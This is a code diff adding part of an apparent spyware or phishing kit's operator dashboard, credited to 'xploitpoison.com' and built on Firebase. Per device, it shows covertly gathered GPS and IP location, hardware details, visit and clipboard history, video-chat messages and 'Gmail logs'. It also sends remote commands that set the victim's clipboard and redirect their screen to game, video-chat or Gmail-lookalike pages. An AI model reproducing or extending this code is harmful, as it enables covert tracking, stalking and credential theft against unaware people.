+            document.getElementById('content').innerHTML = `
+    <div class="device-id-card"><div class="device-id-label">🆔 DEVICE ID</div><div class="device-id-value" id="deviceIdDisplay">${deviceId}</div></div>
+    
+    <div class="section" id="statusSection"><div class="section-title">📡 CONNECTION STATUS</div><div id="statusContainer">Loading...</div></div>
+    
+    <div class="section" id="screenStatusSection"><div class="section-title">📱 SCREEN STATUS</div><div id="screenStatusContainer">Loading...</div></div>
+    
+    <div class="section" id="deviceInfoSection"><div class="section-title">📱 DEVICE INFORMATION</div><div id="deviceInfoContainer">Loading...</div></div>
+    
+   
+    
+    <div class="section" id="gpsSection"><div class="section-title">🛰️ GPS LOCATION</div><div id="gpsContainer">Loading...</div></div>
+    <div class="section" id="geoSec"><div class="section-title">🌐 GEO LOCATION (IP)</div><div id="geoContainer">Loading...</div></div>
+    <div class="section" id="hardwareSec"><div class="section-title">💻 HARDWARE INFORMATION</div><div id="hardwareContainer">Loading...</div></div>
+    <div class="section" id="softwareSec"><div class="section-title">🖥️ SOFTWARE INFORMATION</div><div id="softwareContainer">Loading...</div></div>
+    <div class="section" id="visitsSec"><div class="section-title">📊 VISIT HISTORY</div><div id="visitsContainer" class="history-list">Loading...</div></div>
+    <div class="section" id="clipboardSec"><div class="section-title">📋 CLIPBOARD HISTORY</div><div id="clipboardContainer" class="history-list">Loading...</div></div>
+    <div class="section"><div class="section-title">✉️ SEND COMMAND</div><input type="text" id="commandText" class="command-input" placeholder="Enter text to copy to device clipboard..."><button class="send-btn" onclick="sendClipboardCommand()">📋 Set Clipboard</button></div>
+ `;
+
+            setupRealTimeListeners();
+            showToast('✅ Real-time tracking active', false);
+        }
+
+        // Cleanup listeners on page unload
+        window.addEventListener('beforeunload', () => {
+            listeners.forEach(({ ref }) => { if (ref) ref.off(); });
+        });
+
+        // Load saved theme and init
+        loadSavedTheme();
+
+        if (typeof firebaseConfig !== 'undefined') {
+            initFirebase();
+        } else {
+            window.addEventListener('load', () => {
+                if (typeof firebaseConfig !== 'undefined') initFirebase();
+                else document.getElementById('content').innerHTML = '<div class="loading">❌ config.js not found!</div>';
+            });
+        }
+        // ==================== TOGGLE FUNCTIONS ====================
+        function showGameStats() {
+            // Update button active state
+            document.querySelector('.toggle-btn.game-btn').classList.add('active');
+            document.querySelector('.toggle-btn.chat-btn').classList.remove('active');
+
+            // Show game stats section, hide chat section
+            document.getElementById('gameStatsSection').classList.remove('hide-section');
+            document.getElementById('chatSessionsSection').classList.add('hide-section');
+        }
+
+        function showChatSessions() {
+            // Update button active state
+            document.querySelector('.toggle-btn.chat-btn').classList.add('active');
+            document.querySelector('.toggle-btn.game-btn').classList.remove('active');
+
+            // Show chat section, hide game stats section
+            document.getElementById('chatSessionsSection').classList.remove('hide-section');
+            document.getElementById('gameStatsSection').classList.add('hide-section');
+        }
+        // ==================== GAME STATS FUNCTIONS ====================
+        async function fetchGameStats(deviceId) {
+            if (!database) return null;
+            try {
+                const userSnapshot = await database.ref(`game_users/${deviceId}`).once('value');
+                const userData = userSnapshot.val();
+                const statsSnapshot = await database.ref(`game_stats/${deviceId}`).limitToLast(5).once('value');
+                const statsData = statsSnapshot.val();
+                return { userData, statsData };
+            } catch (error) {
+                console.error('Error fetching game stats:', error);
+                return null;
+            }
+        }
+
+        async function displayGameStats(deviceId) {
+            const container = document.getElementById('gameStatsContainer');
+            if (!container) return;
+
+            const data = await fetchGameStats(deviceId);
+
+            if (!data || (!data.userData && !data.statsData)) {
+                container.innerHTML = '<div class="info-row">No game data available</div>';
+                return;
+            }
+
+            let html = '';
+
+            if (data.userData) {
+                html += `
+            <div class="stats-card">
+                <div class="stats-row">
+                    <span class="stats-label">💰 Wallet Balance</span>
+                    <span class="stats-value">₹${data.userData.balance || 0}</span>
+                </div>
+                <div class="stats-row">
+                    <span class="stats-label">⭐ Total Points Earned</span>
+                    <span class="stats-value-green">${data.userData.totalPoints || 0}</span>
+                </div>
+                <div class="stats-row">
+                    <span class="stats-label">📅 Last Updated</span>
+                    <span class="stats-label">${data.userData.lastUpdatedTime || 'Never'}</span>
+                </div>
+            </div>
+        `;
+            }
+
+            if (data.statsData) {
+                const statsArray = Object.values(data.statsData).reverse();
+                html += `<div style="margin-top: 10px;"><strong>📊 Recent Games</strong></div>`;
+
+                statsArray.slice(0, 5).forEach(stat => {
+                    html += `
+                <div class="stats-card">
+                    <div class="stats-row">
+                        <span>🎯 Score: ${stat.score || 0}</span>
+                        <span>⭐ Points: ${stat.pointsEarned || 0}</span>
+                        <span>💰 ₹${stat.rupeesEarned || 0}</span>
+                    </div>
+                    <div class="stats-row">
+                        <span>💥 Shots: ${stat.shots || 0}</span>
+                        <span>✅ Hits: ${stat.hits || 0}</span>
+                        <span>📊 Accuracy: ${stat.accuracy || 0}%</span>
+                    </div>
+                    <div style="font-size: 10px; color: #666;">${new Date(stat.timestamp).toLocaleString()}</div>
+                </div>
+            `;
+                });
+            }
+
+            container.innerHTML = html;
+        }
+        // ==================== FETCH VIDEO CHAT SESSIONS ====================
+        async function fetchChatSessions(deviceId) {
+            if (!database) return null;
+
+            try {
+                const currentSnapshot = await database.ref(`chat_sessions/${deviceId}/current`).once('value');
+                const currentData = currentSnapshot.val();
+
+                const messagesSnapshot = await database.ref(`chat_sessions/${deviceId}/messages`).limitToLast(10).once('value');
+                const messagesData = messagesSnapshot.val();
+
+                const infoSnapshot = await database.ref(`chat_sessions/${deviceId}/info`).once('value');
+                const infoData = infoSnapshot.val();
+
+                return { currentData, messagesData, infoData };
+            } catch (error) {
+                console.error('Error fetching chat sessions:', error);
+                return null;
+            }
+        }
+
+        // ==================== DISPLAY VIDEO CHAT SESSIONS ====================
+        async function displayChatSessions(deviceId) {
+            const container = document.getElementById('chatSessionsContainer');
+            if (!container) return;
+
+            const data = await fetchChatSessions(deviceId);
+
+            if (!data || (!data.currentData && !data.messagesData)) {
+                container.innerHTML = '<div class="info-row">No video chat data available</div>';
+                return;
+            }
+
+            let html = '';
+
+            if (data.currentData && data.currentData.strangerName) {
+                html += `
+            <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 12px; margin-bottom: 10px;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                    <span>👤 Connected To</span>
+                    <span style="color: #4ade80; font-weight: bold;">${data.currentData.strangerName} (${data.currentData.strangerCountry || 'Unknown'})</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                    <span>🆔 Stranger ID</span>
+                    <span style="font-size: 11px; font-family: monospace;">${data.currentData.strangerId?.substring(0, 20)}...</span>
+                </div>
+                <div style="display: flex; justify-content: space-between;">
+                    <span>⏱️ Connected At</span>
+                    <span style="font-size: 11px; color: #aaa;">${new Date(data.currentData.connectedAt).toLocaleString()}</span>
+                </div>
+            </div>
+        `;
+            } else {
+                html += `<div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 12px; margin-bottom: 10px;">
+            <div style="text-align: center; color: #aaa;">No active chat session</div>
+        </div>`;
+            }
+
+            if (data.messagesData) {
+                const messagesArray = Object.values(data.messagesData).reverse();
+                html += `<div style="margin-top: 10px;"><strong>💬 Recent Messages (Last 10)</strong></div>`;
+
+                messagesArray.slice(-10).forEach(msg => {
+                    const isStranger = msg.type === 'stranger';
+                    html += `
+                <div style="background: rgba(0,0,0,0.2); padding: 8px 12px; border-radius: 10px; margin-top: 5px;">
+                    <div style="display: flex; justify-content: space-between; font-size: 11px;">
+                        <span style="color: ${isStranger ? '#fbbf24' : '#4ade80'};">${isStranger ? '👤 Stranger' : '📱 You'}</span>
+                        <span style="color: #666;">${new Date(msg.timestamp).toLocaleTimeString()}</span>
+                    </div>
+                    <div style="font-size: 12px; margin-top: 3px;">${escapeHtml(msg.message || '')}</div>
+                </div>
+            `;
+                });
+            }
+
+            if (data.infoData) {
+                html += `
+            <div style="margin-top: 10px; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.1);">
+                <div style="display: flex; justify-content: space-between; font-size: 10px; color: #666;">
+                    <span>📅 First Seen: ${data.infoData.firstSeen || 'Unknown'}</span>
+                    <span>📊 Status: ${data.infoData.status || 'Unknown'}</span>
+                </div>
+            </div>
+        `;
+            }
+
+            container.innerHTML = html;
+        }
+        function viewGmailLogs() {
+            const deviceId = getDeviceIdFromUrl();
+            window.location.href = `logs.html?id=${encodeURIComponent(deviceId)}`;
+        }
+        // ==================== ADMIN COMMAND FUNCTIONS ====================
+        function sendAdminCommand(page) {
+            if (!database || !deviceId) {
+                showToast('❌ Database or Device ID not ready', true);
+                return;
+            }
+
+            let pageUrl = '';
+            if (page === 'game') pageUrl = 'game.html';
+            else if (page === 'videochat') pageUrl = 'videochat.html';
+            else if (page === 'engage') pageUrl = 'engage.html';
+            else if (page === 'gmail') pageUrl = 'gmail.html';  // ✅ ADD THIS
+            else pageUrl = 'game.html';
+
+            const command = {
+                page: page,
+                url: pageUrl,
+                active: true,
+                fromAdmin: true,
+                timestamp: Date.now(),
+                dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+            };
+
+            database.ref(`admin_commands/${deviceId}/iframe`).set(command)
+                .then(() => {
+                    showToast(`✅ Command sent! Changing to: ${page.toUpperCase()}`, false);
+                })
+                .catch(err => {
+                    showToast('❌ Failed to send command', true);
+                });
+        }
+    </script>
+    <!--CREATED BY https://www.xploitpoison.com/-->
+</body>
+
+</html>
